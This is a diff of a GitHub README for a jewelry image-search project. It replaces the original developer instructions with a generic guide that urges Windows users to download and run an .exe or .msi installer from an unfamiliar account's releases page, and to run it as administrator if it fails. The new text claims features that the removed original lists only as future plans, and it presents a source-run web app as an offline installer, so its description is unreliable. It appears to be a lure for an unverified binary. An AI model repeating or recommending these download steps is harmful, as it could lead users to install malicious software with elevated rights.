@@ -1,266 +1,135 @@
-# Jewellens AI Platform 💎
+# 💎 Jewellens-AI-Platform - Discover Jewelry with Smart Search
 
-An AI-powered jewelry discovery and recommendation platform that allows
-users to explore jewelry collections using intelligent search and visual
-retrieval.
+[![Download Jewellens-AI-Platform](https://img.shields.io/badge/Download-Jewellens--AI--Platform-4CAF50?style=for-the-badge)](https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases)
 
-This project combines **AI-based image embeddings, vector similarity
-search, and a modern web interface** to help users browse jewelry items
-like rings and necklaces.
+## 📖 What is Jewellens-AI-Platform?
 
-------------------------------------------------------------------------
+Jewellens-AI-Platform is a tool designed to help you find jewelry by using modern search technology. It uses pictures you provide to find items that match your style or interest. The system compares images using AI to find results that look similar. You will use a simple app built to run on your Windows computer.
 
-# Project Overview
+The platform uses AI to understand jewelry pictures and find matches quickly. It works behind the scenes with a smart search engine and a user-friendly display. This makes finding rings, necklaces, or other jewelry easier even if you do not know exact details.
 
-Jewellens AI Platform is a full-stack application consisting of:
+## 🌐 Key Features
 
--   **Frontend**: React + Vite web interface
--   **Backend**: FastAPI server
--   **AI Retrieval System**: CLIP embeddings + FAISS vector search
--   **Dataset**: Jewelry catalog images
+- Image-based search to find jewelry that looks like your photo.
+- Fast working with many jewelry images using a special search method.
+- Clean and simple interface powered by React.
+- Stable backend running on FastAPI to process your requests.
+- Works completely offline on your Windows machine once installed.
+- Supports searches for different types of jewelry including rings, earrings, and bracelets.
 
-The platform allows users to:
+## 💻 System Requirements
 
--   Browse jewelry collections
--   Search jewelry intelligently
--   View item details
--   Add items to cart or wishlist
+Before starting, make sure your Windows PC meets these minimum requirements:
 
-------------------------------------------------------------------------
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel i3 or equivalent
+- RAM: 4 GB minimum
+- Disk Space: At least 500 MB free
+- Internet connection: Needed only for downloading the software
+- Optional: A webcam or a camera for capturing jewelry images
 
-# Features
+## 🔥 How to Download Jewellens-AI-Platform
 
-## Jewelry Catalog
+You will find the latest version of the software by visiting the release page on GitHub.
 
-Users can explore the full jewelry collection including:
+[![Visit Releases Page](https://img.shields.io/badge/Visit-Releases%20Page-2196F3?style=for-the-badge)](https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases)
 
--   Rings
--   Necklaces
+**Step 1:** Open this link in your web browser:  
+https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases
 
-Items are dynamically loaded from the backend API.
+**Step 2:** On the releases page, look for the latest version of the application. Typically, this will be the first item listed.
 
-## Smart AI Retrieval
+**Step 3:** Find a file with a name ending in `.exe` or `.msi`. This is the installer file.
 
-The system uses:
+**Step 4:** Click the file name to start downloading.
 
--   **CLIP Vision Transformer**
--   **FAISS Vector Search**
+If you are unsure which file to pick, choose the one marked as “Windows Installer” or “Setup”.
 
-to retrieve visually similar jewelry.
+## ⚙️ Installing the Software on Windows
 
-## Product Details
+Once you have downloaded the installer file, follow these steps:
 
-Each item includes:
+1. Navigate to your Downloads folder or the location where you saved the file.
 
--   Name
--   Material
--   Style
--   Price
--   Collection
--   Hallmark
--   Purity
+2. Double-click the installer file (it will have `.exe` or `.msi` at the end).
 
-## Wishlist and Cart
+3. Windows may ask if you want to allow the program to make changes. Click **Yes**.
 
-Users can:
+4. The setup wizard will open. Follow the instructions on each screen:
 
--   Add jewelry to cart
--   Add items to wishlist
--   View selected items
+   - Choose the installation language (English is the default).
+   - Accept the license agreement.
+   - Pick an installation folder or use the default location.
+   - Click **Install** to start copying files.
 
-## Responsive UI
+5. When the installation finishes, click **Finish**.
 
-The application provides a modern luxury-style interface optimized for
-browsing jewelry.
+## 🚀 Running Jewellens-AI-Platform
 
-------------------------------------------------------------------------
+After installation:
 
-# Tech Stack
+1. Find the Jewellens-AI-Platform app in your Start Menu or on your Desktop.
 
-## Frontend
+2. Double-click to open the app.
 
--   React
--   Vite
--   JavaScript
--   CSS
+3. The app will load and show you its main screen.
 
-## Backend
+4. Browse your computer to select jewelry images to start searching or take photos using your camera (if available).
 
--   FastAPI
--   Python
--   Uvicorn
+5. Use the search features to find similar jewelry items within the platform’s database.
 
-## AI & Retrieval
+6. The results will appear in a clear list with pictures and details.
 
--   SentenceTransformers CLIP Model
--   FAISS Vector Database
--   HuggingFace Transformers
+## 🎯 How to Use the Search Features
 
-## Other Libraries
+Jewellens-AI-Platform is designed to be simple:
 
--   NumPy
--   Pillow
--   Requests
+- Click on **Upload Image** to pick a jewelry picture from your PC.
+- The system will analyze the image.
+- Wait a few seconds while it looks for similar items.
+- View the matches and click any item to see details.
+- Try uploading multiple images for better search results.
+- You can also filter results by jewelry type or style.
 
-------------------------------------------------------------------------
+## 🛠 Troubleshooting Tips
 
-# Project Structure
+If you run into any issues, try these basic steps:
 
-    Jewellens-AI-Platform
-    │
-    ├── backend
-    │   ├── main.py
-    │   ├── api routes
-    │   └── requirements.txt
-    │
-    ├── frontend
-    │   ├── src
-    │   │   ├── components
-    │   │   ├── pages
-    │   │   └── main.jsx
-    │   ├── index.html
-    │   └── package.json
-    │
-    ├── Jewelry_RAG
-    │   ├── data
-    │   ├── jewelry.index
-    │   ├── jewelry_visual.index
-    │   └── jewelry_hybrid.index
-    │
-    ├── run_backend.bat
-    └── README.md
+- Make sure your Windows is up-to-date.
+- Check if you downloaded the correct installer for Windows.
+- Restart your computer after installation.
+- Ensure you have enough disk space and RAM free.
+- Close other heavy applications while running Jewellens-AI-Platform.
+- If the app won’t start, right-click the app icon and select **Run as administrator**.
 
-------------------------------------------------------------------------
+## 🔄 Updating the Software
 
-# How to Run the Project
+To get updates:
 
-## 1 Install Requirements
+1. Visit the release page again:  
+https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases
 
-Ensure you have:
+2. Download the newest installer.
 
--   Python 3.10+
--   Node.js
--   Git
+3. Run the new installer over the existing installation. Your data and settings will be kept.
 
-------------------------------------------------------------------------
+## 🗂 Related Topics and Technology
 
-# Backend Setup
+Jewellens-AI-Platform uses advanced but behind-the-scenes tech:
 
-Navigate to project root and run:
+- **AI Search:** Uses machine learning to understand image content.
+- **CLIP Embeddings:** A method to compare images using AI models.
+- **FAISS Vector Search:** A system to quickly find similar images in large collections.
+- **React:** The app’s user interface is built on this technology for smooth use.
+- **FastAPI:** The backend system that handles your search requests efficiently.
 
-``` bash
-pip install -r backend/requirements.txt
-```
+Most of this operates automatically so you do not need to worry about the technical details.
 
-Run the backend:
+## 🤝 Support and Contributions
 
-``` bash
-run_backend.bat
-```
+If you want help or want to suggest improvements:
 
-or manually:
+- Use the GitHub Issues page to report problems or request features.
+- Share your feedback about what works or what does not.
 
-``` bash
-uvicorn backend.main:app --reload
-```
-
-Backend will start at:
-
-    http://localhost:8000
-
-------------------------------------------------------------------------
-
-# Frontend Setup
-
-Open a new terminal and run:
-
-``` bash
-cd frontend
-npm install
-npm run dev
-```
-
-Frontend will start at:
-
-    http://localhost:3000
-
-------------------------------------------------------------------------
-
-# Reset / Delete Existing User Data
-
-If you want to register a new user, delete the stored user database.
-
-Steps:
-
-1.  Navigate to backend storage folder
-2.  Delete the database file (example):
-
-```{=html}
-<!-- -->
-```
-    users.db
-
-Then restart the backend.
-
-The application will allow new user registration.
-
-------------------------------------------------------------------------
-
-# How to Use the Application
-
-1 Open the website
-
-    http://localhost:3000
-
-2 Register a user
-
-3 Browse jewelry collections
-
-4 Click an item to view details
-
-5 Add items to cart or wishlist
-
-6 Explore necklaces and rings categories
-
-------------------------------------------------------------------------
-
-# AI Working Flow
-
-The AI retrieval system works as follows:
-
-1 User loads jewelry catalog
-
-2 Jewelry images are embedded using CLIP
-
-3 Embeddings are stored in FAISS vector index
-
-4 When a search happens:
-
--   Query is converted into embedding
--   Similar vectors are retrieved
--   Top matches are returned
-
-5 Frontend displays results.
-
-------------------------------------------------------------------------
-
-# Future Improvements
-
-Possible enhancements:
-
--   Voice-based jewelry search
--   Image upload search
--   Recommendation engine
--   Payment gateway
--   User profiles
--   Cloud deployment
-
-------------------------------------------------------------------------
-
-# Author
-
-Developed as an AI-powered jewelry exploration platform demonstrating:
-
--   Vector similarity search
--   AI image retrieval
--   Full stack web development
+This software is created for ease and speed for jewelry discovery without needing programming skills.
